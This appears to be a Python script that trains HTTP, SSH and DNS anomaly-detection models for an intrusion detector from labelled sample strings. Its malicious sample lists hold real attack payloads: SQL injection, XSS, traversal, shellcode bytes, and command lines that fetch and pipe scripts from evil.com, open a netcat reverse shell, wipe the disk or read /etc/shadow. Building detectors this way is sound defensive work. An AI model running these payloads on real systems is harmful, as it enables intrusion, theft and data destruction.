"""
Sentinel ML Engine v2.0 - Model Training Script

Trains THREE separate Isolation Forest models, one per protocol:
    - HTTP  : SQL injection, XSS, command injection, path traversal, evasion
    - SSH   : Brute force, banner grabbing, weak ciphers, shellcode, tunneling
    - DNS   : Tunneling, DGA domains, amplification, TXT/ANY abuse

Each model is trained on its own data and its own feature set.
This ensures each model knows what "normal" looks like for its protocol.
"""

from model import MLAnomalyDetector
import config


# ==============================================================================
# HTTP TRAINING DATA  (original — unchanged)
# ==============================================================================

def generate_http_training_data():
    """
    HTTP training dataset.
    Mix of normal web traffic and web-layer attacks.

    Returns:
        tuple: (payloads, labels)  — labels: 1=malicious, 0=benign
    """

    # ── Benign ────────────────────────────────────────────────────────────────
    benign = [
        # Normal GET requests
        "GET /index.html HTTP/1.1",
        "GET /about.html HTTP/1.1",
        "GET /contact.html HTTP/1.1",
        "GET /products.html HTTP/1.1",
        "GET /blog/2024/article.html HTTP/1.1",
        "GET /images/logo.png HTTP/1.1",
        "GET /css/style.css HTTP/1.1",
        "GET /js/script.js HTTP/1.1",
        "GET /favicon.ico HTTP/1.1",
        "GET /sitemap.xml HTTP/1.1",

        # Normal POST requests
        "POST /api/login username=john&password=secret123",
        "POST /api/register email=user@example.com&name=John",
        "POST /api/search query=machine learning tutorials",
        "POST /api/comment content=Great article, thanks!",
        "POST /api/subscribe email=user@example.com",

        # Normal API calls
        "GET /api/users/123",
        "GET /api/products?category=electronics",
        "GET /api/posts?page=1&limit=10",
        "POST /api/orders {productid: 456, quantity: 2}",
        "PUT /api/profile {name: 'John Doe', bio: 'Developer'}",

        # Normal searches
        "search?q=python programming",
        "search?q=best restaurants near me",
        "search?q=weather forecast",
        "filter?category=books&price_min=10&price_max=50",

        # More benign variations
        "GET /docs/tutorial.pdf HTTP/1.1",
        "GET /downloads/software.zip HTTP/1.1",
        "POST /feedback message=The site is great!",
        "GET /api/news?date=2024-01-15",
        "GET /profile/user123",
        "POST /api/upload filename=document.pdf",
    ]

    # ── SQL Injection ─────────────────────────────────────────────────────────
    sql_injection = [
        "admin' OR '1'='1'--",
        "' OR 1=1--",
        "admin'--",
        "' OR 'a'='a",
        "1' AND 1=1--",
        "' UNION SELECT NULL--",
        "' UNION SELECT password FROM users--",
        "' UNION SELECT username, password FROM admin--",
        "'; DROP TABLE users--",
        "admin' OR '1'='1'/*",
        "1' AND 'a'='a",
        "' OR ''='",
        "' UNION SELECT @@version--",
        "' UNION SELECT database()--",
        "1' ORDER BY 10--",
        "' UNION ALL SELECT NULL, NULL, NULL--",
        "admin' OR 1=1 LIMIT 1--",
        "' AND 1=0 UNION SELECT NULL, NULL--",
        "' UNION SELECT table_name FROM information_schema.tables--",
        "admin') OR ('1'='1'--",
    ]

    # ── XSS ───────────────────────────────────────────────────────────────────
    xss_attacks = [
        "<script>alert('XSS')</script>",
        "<script>document.cookie</script>",
        "<img src=x onerror=alert('XSS')>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "javascript:alert('XSS')",
        "<body onload=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "<script>window.location='http://evil.com'</script>",
        "'-alert(1)-'",
        "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ]

    # ── Command Injection ─────────────────────────────────────────────────────
    command_injection = [
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "&& cat /etc/passwd",
        "; ls -la /root",
        "| whoami",
        "&& id",
        "; wget http://evil.com/malware.sh",
        "| curl http://evil.com/malware | bash",
        "; rm -rf /",
        "&& nc -e /bin/bash evil.com 4444",
        "`cat /etc/shadow`",
        "$(whoami)",
        "; ps aux | grep root",
        "| find / -name '*.key'",
        "&& chmod +x /tmp/backdoor.sh",
    ]

    # ── Path Traversal ────────────────────────────────────────────────────────
    path_traversal = [
        "../../../../etc/passwd",
        "../../../etc/shadow",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "../../../../../../etc/passwd%00.jpg",
        "../../../../../../../windows/win.ini",
        "....//....//....//windows/system32/drivers/etc/hosts",
    ]

    # ── Other Attacks ─────────────────────────────────────────────────────────
    other_attacks = [
        "*)(uid=*))(|(uid=*",
        "admin*",
        "*)(&(objectClass=*",
        "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "http://localhost:8080/admin",
        "http://169.254.169.254/latest/meta-data/",
        "shell.php%00.jpg",
        "backdoor.php.jpg",
    ]

    # ── Obfuscated / Evasion ──────────────────────────────────────────────────
    obfuscated = [
        "%27%20OR%20%271%27%3D%271",
        "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        "%2527%2520OR%2520%25271%2527%253D%25271",
        "ad'/**/OR/**/1=1--",
        "SEL/**/ECT * FROM users",
        "SeLeCt * FrOm users",
        "<ScRiPt>alert(1)</sCrIpT>",
        "/etc/passwd%00.jpg",
        "file.php%00.txt",
    ]

    malicious = (
        sql_injection +
        xss_attacks +
        command_injection +
        path_traversal +
        other_attacks +
        obfuscated
    )

    payloads = benign + malicious
    labels   = [0] * len(benign) + [1] * len(malicious)

    return payloads, labels


# ==============================================================================
# SSH TRAINING DATA
# ==============================================================================

def generate_ssh_training_data():
    """
    SSH training dataset.
    Teaches the model what normal SSH traffic looks like vs attacks.

    Normal SSH traffic:
        - Standard version banners from real clients
        - Legitimate key exchange negotiation strings
        - Normal auth method requests

    Malicious SSH traffic:
        - Brute force (short payloads, common usernames)
        - Weak cipher / KEX downgrade attacks
        - Known CVE exploit strings
        - Shellcode / binary injection
        - Tunneling abuse

    Returns:
        tuple: (payloads, labels)  — labels: 1=malicious, 0=benign
    """

    # ── Benign SSH ────────────────────────────────────────────────────────────
    benign = [
        # Standard SSH client banners (legitimate software)
        "SSH-2.0-OpenSSH_8.9",
        "SSH-2.0-OpenSSH_9.0",
        "SSH-2.0-OpenSSH_9.3",
        "SSH-2.0-PuTTY_Release_0.78",
        "SSH-2.0-PuTTY_Release_0.79",
        "SSH-2.0-libssh2_1.10.0",
        "SSH-2.0-Bitvise-9.33",
        "SSH-2.0-RebexSSH_5.0",
        "SSH-2.0-JSCH-0.1.55",
        "SSH-2.0-paramiko_3.1.0",

        # Legitimate key exchange proposals (modern secure algorithms)
        "curve25519-sha256,ecdh-sha2-nistp256,diffie-hellman-group14-sha256",
        "curve25519-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512",
        "ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256",
        "curve25519-sha256@libssh.org,ecdh-sha2-nistp256",
        "diffie-hellman-group14-sha256,diffie-hellman-group16-sha512",

        # Legitimate cipher proposals (modern secure ciphers)
        "aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com",
        "aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr",
        "chacha20-poly1305@openssh.com,aes256-gcm@openssh.com",
        "aes256-ctr,aes192-ctr,aes128-ctr",
        "aes128-gcm@openssh.com,aes256-gcm@openssh.com",

        # Legitimate auth method requests
        "publickey,gssapi-keyex,gssapi-with-mic,password",
        "publickey,password",
        "publickey",
        "keyboard-interactive,password",
        "gssapi-with-mic,publickey,password",

        # Legitimate system usernames (non-suspicious context)
        "deploy@production-server-01",
        "ansible@web-node-03",
        "jenkins@build-server",
        "ubuntu@ip-10-0-1-50",
        "ec2-user@ip-172-31-20-14",
    ]

    # ── Brute Force / Credential Stuffing ─────────────────────────────────────
    brute_force = [
        # Common default usernames (typical brute force targets)
        "root",
        "admin",
        "administrator",
        "pi",
        "oracle",
        "postgres",
        "mysql",
        "guest",
        "test",
        "support",
        "user",
        "vagrant",
        "ubuntu",
        "deploy",
        "ansible",
        "oracle",
        "nagios",
        "www-data",
        "ftp",
        "mail",
       "backup",
       "git",
       "jenkins",

        # Username:password combos (credential stuffing format)
        "root:root",
        "admin:admin",
        "admin:password",
        "root:toor",
        "admin:123456",
        "root:password123",
        "admin:admin123",
        "user:user",
        "test:test",
        "guest:guest",
    ]

    # ── Weak Cipher / KEX Downgrade ───────────────────────────────────────────
    downgrade_attacks = [
        # Weak/broken key exchange algorithms
        "diffie-hellman-group1-sha1",
        "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1",
        "gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==",

        # Broken/weak ciphers
        "3des-cbc,aes128-cbc",
        "3des-cbc,aes256-cbc",
        "aes128-cbc,3des-cbc,aes256-cbc",
        "arcfour,arcfour128,arcfour256",
        "arcfour256,arcfour128,arcfour",
        "blowfish-cbc,3des-cbc,arcfour",
        "des-cbc,3des-cbc,blowfish-cbc",
        "rc4,arcfour,blowfish-cbc",

        # Mixed weak + strong (downgrade attempt)
        "arcfour,aes128-ctr,aes256-ctr",
        "blowfish-cbc,chacha20-poly1305@openssh.com",
    ]

    # ── Known CVE Exploit Strings ─────────────────────────────────────────────
    exploit_strings = [
        # CVE-2018-10933: libssh authentication bypass
        "libssh 0.6.0 authentication bypass",
        "libssh authentication bypass MSG_USERAUTH_SUCCESS",
        "libssh 0.7.3 server-side state machine",

        # OpenSSH memory corruption probes
        "SSH-2.0-OpenSSH_7.2 exploit",
        "SSH-1.99-OpenSSH_3.4 overflow",
        "SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7",

        # Malformed version strings used in fuzzing
        "SSH-2.0-" + "A" * 256,
        "SSH-2.0-\x00\x00\x00\x00",
        "SSH-1.0-exploit_probe",
        "SSH-2.0-masscan",
    ]

    # ── Shellcode / Binary Injection ──────────────────────────────────────────
    shellcode = [
        # NOP sled patterns
        "\x90\x90\x90\x90\x90\x90\x90\x90shellcode",
        "\x90" * 16 + "\xeb\x0e",
        "\x41" * 32 + "\x90\x90\x90\x90",

        # Null byte overflow probes
        "\x00" * 8 + "overflow",
        "payload\x00\x00\x00\x00\x00",
        "\x00\x00\x00\x00" + "A" * 20,

        # Common shellcode sequences
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68",  # classic execve /bin/sh
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0",  # jmp-call-pop shellcode stub
    ]

    # ── Tunneling / Port Forwarding Abuse ─────────────────────────────────────
    tunneling = [
        "direct-tcpip 127.0.0.1 8080",
        "direct-tcpip localhost 3306",
        "forwarded-tcpip 0.0.0.0 4444",
        "tcpip-forward 0.0.0.0 443",
        "direct-tcpip 10.0.0.1 22",
        "direct-tcpip internal-db.corp 5432",
        "forwarded-tcpip attacker.com 9001",
        "tcpip-forward 0.0.0.0 8443",
        "direct-tcpip 192.168.1.1 80",
        "direct-streamlocal@openssh.com /var/run/docker.sock",
    ]

    malicious = (
        brute_force +
        downgrade_attacks +
        exploit_strings +
        shellcode +
        tunneling
    )

    payloads = benign + malicious
    labels   = [0] * len(benign) + [1] * len(malicious)

    return payloads, labels


# ==============================================================================
# DNS TRAINING DATA
# ==============================================================================

def generate_dns_training_data():
    """
    DNS training dataset.
    Teaches the model what normal DNS queries look like vs attacks.

    Normal DNS traffic:
        - Everyday domain lookups (low entropy, human-readable, shallow depth)

    Malicious DNS traffic:
        - Tunneling (iodine, dnscat2 — high entropy, long subdomains)
        - DGA domains (algorithmically generated — no vowels, high consonant clusters)
        - Amplification attacks (ANY queries, large record type requests)
        - TXT/NULL record abuse for data exfiltration

    Returns:
        tuple: (payloads, labels)  — labels: 1=malicious, 0=benign
    """

    # ── Benign DNS ────────────────────────────────────────────────────────────
    benign = [
        # Everyday popular domains
        "www.google.com",
        "www.youtube.com",
        "www.facebook.com",
        "www.amazon.com",
        "www.wikipedia.org",
        "www.twitter.com",
        "www.reddit.com",
        "www.linkedin.com",
        "www.github.com",
        "www.stackoverflow.com",

        # Corporate / infrastructure domains
        "mail.company.com",
        "vpn.company.com",
        "intranet.company.com",
        "api.company.com",
        "cdn.company.com",
        "auth.company.com",
        "git.internal.company.com",
        "monitoring.ops.company.com",

        # Cloud provider domains
        "s3.amazonaws.com",
        "ec2.us-east-1.amazonaws.com",
        "storage.googleapis.com",
        "blob.core.windows.net",
        "login.microsoftonline.com",

        # Normal subdomains (shallow depth, readable)
        "blog.example.com",
        "shop.example.com",
        "support.example.com",
        "news.bbc.co.uk",
        "docs.python.org",
        "api.github.com",
    ]

    # ── DNS Tunneling (iodine / dnscat2) ──────────────────────────────────────
    # These tools encode data in subdomains — base32/base64, high entropy, long labels
    tunneling = [
        # iodine-style base32 encoded subdomains
        "aGVsbG8gd29ybGQ.tunnel.evil.com",
        "dGhpcyBpcyBhIHRlc3Q.tunnel.evil.com",
        "c3VwZXJzZWNyZXRkYXRh.exfil.attacker.com",
        "cGFzc3dvcmQ6czNjcjN0.data.evil.com",
        "KRQXG33MOVWSYIDMMVWGKIDCMFZWKNZYGI.t.attacker.com",
        "MFRA.OBQXE2LJMQQGC3TBNVSQ.t.attacker.com",
        "orsxg5a.mfra.obqxe2ljmqqgc3tbnvsq.t.evil.com",

        # dnscat2-style hex encoded subdomains
        "4865c6c6f20576f726c64.dnscat.evil.com",
        "deadbeefcafebabe0102.cmd.attacker.com",
        "0a1b2c3d4e5f6a7b8c9d.exfil.evil.com",
        "ffffffffffffffffffffffff.data.attacker.com",

        # Long label tunneling (exceeds normal subdomain length)
        "verylongencodedpayloadthatexceedsanynormaldomain.tunnel.com",
        "aabbccddeeffaabbccddeeffaabbccdd.exfil.evil.com",
        "thisisaverylongsubdomainusedfortunnelingdata1234.attacker.com",
        "encodedchunkofstolendatabeingexfiltratedslowly.c2.evil.com",
        "a1f3c9d2b8e4.a2b3c4d5.evil.com",
        "deadbeef0102cafe.c2server.com"
    ]

    # ── DGA Domains (Domain Generation Algorithms) ────────────────────────────
    # Malware uses DGA to generate random-looking C2 domains daily
    # Characteristics: high entropy, low vowels, long consonant clusters
    dga_domains = [
        # Classic DGA patterns — no recognizable words, consonant-heavy
        "xkqvzmnprt.ru",
        "bnmwqlzxcv.top",
        "qwrtypsdfg.info",
        "zxcvbnmqwp.biz",
        "plkjhgfdsa.xyz",
        "mnbvcxzlkj.club",
        "qzxwsedcrf.online",
        "vfrtgbnhyj.site",
        "bfghjklmnpqrstvwxz.biz",
        "cdfghjklmnpqrst.online",
        "vwxzbfghjklm.site",

        # DGA with digit mixing
        "xk3v9zm2prt.ru",
        "b4nm8ql7xcv.top",
        "q2rty5sdfg9.info",
        "z1xc3bn5qwp.biz",

        # Longer DGA domains
        "kqvzmnprtbsdfghjkl.com",
        "bnmwqlzxcvqwertyui.net",
        "zxcvbnmqwplkjhgfds.org",
        "plkjhgfdsazxcvbnmq.ru",
    ]

    # ── DNS Amplification / Reflection ────────────────────────────────────────
    # Attackers send small ANY queries to open resolvers
    # The large responses are reflected to the victim (DDoS amplification)
    amplification = [
        # ANY queries — return everything, maximum amplification factor
        "ANY isc.org",
        "ANY google.com",
        "ANY cloudflare.com",
        "ANY . ANY",
        "ANY akamai.com",

        # Large record type requests to open resolvers
        "ANY ripe.net",
        "ANY iana.org",
        "ANY verisign.com",
        "ANY internic.net",
        "ANY dns.google",
    ]

    # ── TXT / NULL Record Exfiltration ────────────────────────────────────────
    # Attackers embed stolen data in TXT record queries
    txt_exfil = [
        # TXT queries with encoded data in subdomain
        "TXT c3VwZXJzZWNyZXQ.exfil.attacker.com",
        "TXT dXNlcm5hbWU6cGFzc3dvcmQ.data.evil.com",
        "TXT Y3JlZGVudGlhbHM6YWRtaW4.steal.attacker.com",
        "TXT aW50ZXJuYWxkb2N1bWVudA.exfil.evil.com",
        "TXT c3NobGV5OmtleXMK.exfil.attacker.com",

        # NULL record abuse (used by older tunneling tools)
        "NULL encodedpayload.tunnel.evil.com",
        "NULL deadbeef.exfil.attacker.com",
        "NULL aGVsbG8K.data.evil.com",

        # Suspicious TXT lookups to non-corporate domains
        "TXT internal-passwords.attacker.com",
        "TXT stolen-keys.evil.com",
        "TXT db-credentials.attacker.com",
    ]

    malicious = (
        tunneling +
        dga_domains +
        amplification +
        txt_exfil
    )

    payloads = benign + malicious
    labels   = [0] * len(benign) + [1] * len(malicious)

    return payloads, labels


# ==============================================================================
# TRAINING RUNNER
# ==============================================================================

def train_protocol(protocol, payloads, labels):
    """
    Train and save one Isolation Forest model for a given protocol.

    Args:
        protocol (str)  : 'HTTP', 'SSH', or 'DNS'
        payloads (list) : Raw payload strings
        labels   (list) : 0=benign, 1=malicious

    Returns:
        MLAnomalyDetector: Trained detector instance
    """
    print(f"\n{'='*80}")
    print(f"  TRAINING {protocol} MODEL")
    print(f"{'='*80}")
    print(f"  Dataset : {len(payloads)} samples")
    print(f"  Benign  : {labels.count(0)}")
    print(f"  Malicious: {labels.count(1)}")
    print(f"  Ratio   : {labels.count(1)/len(labels):.1%} malicious")

    detector = MLAnomalyDetector(protocol=protocol)
    detector.train(payloads, labels=labels)
    detector.save_model(filename=f"sentinel_model_{protocol.lower()}.pkl")

    print(f"\n  [OK] {protocol} model saved → sentinel_model_{protocol.lower()}.pkl")

    return detector


def main():
    """
    Train all three protocol models sequentially.
    Each model is independent — its own data, its own features, its own file.
    """
    print("=" * 80)
    print("  SENTINEL ML ENGINE v2.0 — MULTI-PROTOCOL MODEL TRAINING")
    print("=" * 80)
    print("\n  Training 3 separate models: HTTP | SSH | DNS")
    print("  Each model learns what normal vs malicious looks like")
    print("  for its own protocol.\n")

    # ── Train HTTP ─────────────────────────────────────────────────────────────
    http_payloads, http_labels = generate_http_training_data()
    train_protocol("HTTP", http_payloads, http_labels)

    # ── Train SSH ──────────────────────────────────────────────────────────────
    ssh_payloads, ssh_labels = generate_ssh_training_data()
    train_protocol("SSH", ssh_payloads, ssh_labels)

    # ── Train DNS ──────────────────────────────────────────────────────────────
    dns_payloads, dns_labels = generate_dns_training_data()
    train_protocol("DNS", dns_payloads, dns_labels)

    # ── Summary ────────────────────────────────────────────────────────────────
    print(f"\n{'='*80}")
    print("  TRAINING COMPLETE")
    print(f"{'='*80}")
    print("\n  Models saved:")
    print("    sentinel_model_http.pkl  — detects SQL, XSS, command injection, traversal")
    print("    sentinel_model_ssh.pkl   — detects brute force, exploits, shellcode, tunneling")
    print("    sentinel_model_dns.pkl   — detects tunneling, DGA, amplification, exfiltration")
    print("\n  You can now run:")
    print("    python main.py --mode test")
    print("    python main.py --mode interactive")
    print(f"{'='*80}\n")


if __name__ == "__main__":
    main()
